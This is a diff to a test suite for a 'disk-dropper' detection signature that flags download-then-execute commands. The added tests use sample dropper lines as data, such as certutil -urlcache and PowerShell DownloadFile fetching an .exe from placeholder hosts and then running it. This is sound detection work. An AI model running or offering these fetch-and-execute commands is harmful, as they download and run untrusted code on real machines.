@@ -327,6 +327,19 @@ describe('download-to-disk-then-exec dropper (review 2.2)', () => {
   it('does NOT fire on a bare exec with no fetch to disk', () => {
     expect(sig('Start-Process notepad.exe')).not.toContain('disk-dropper')
   })
+  it('review fix (a): does NOT fire when the fetching tool\'s own fully-qualified name sits at corpus position 0 — a `^`-anchored .exe token is never an exec sink, only a separator-anchored one is', () => {
+    expect(sig('certutil.exe -urlcache -split -f http://x.test/a.exe destination.exe')).not.toContain('disk-dropper')
+    expect(sig('powershell.exe -Command "iwr http://e/a.exe -OutFile a.exe"')).not.toContain('disk-dropper')
+  })
+  it('review fix (a) regression: a genuinely separator-anchored bare .exe run (`& a.exe`) still fires', () => {
+    expect(sig('certutil -urlcache -split -f http://x.test/a.exe a.exe & a.exe')).toContain('disk-dropper')
+  })
+  it('review fix (b): does NOT fire on a benign fetch-to-disk whose corpus merely contains "ascii" (Out-File -Encoding ascii) — the bare \'ii \' substring needle used to collide with it', () => {
+    expect(sig('certutil -urlcache -split -f http://x.test/a.exe a.exe; Out-File -Encoding ascii report.txt')).not.toContain('disk-dropper')
+  })
+  it('review fix (b) regression: the genuine Invoke-Item alias (a separator-anchored `& ii ...` call-operator form) still fires', () => {
+    expect(sig("(New-Object Net.WebClient).DownloadFile('http://e/a.exe','a.exe'); & ii a.exe")).toContain('disk-dropper')
+  })
   it('is STRONG on its own (a dropper has a benign-installer twin)', () => {
     expect(specOf("(New-Object Net.WebClient).DownloadFile('http://e/a.exe','a.exe'); Start-Process a.exe", 'disk-dropper')).toBe('strong')
   })
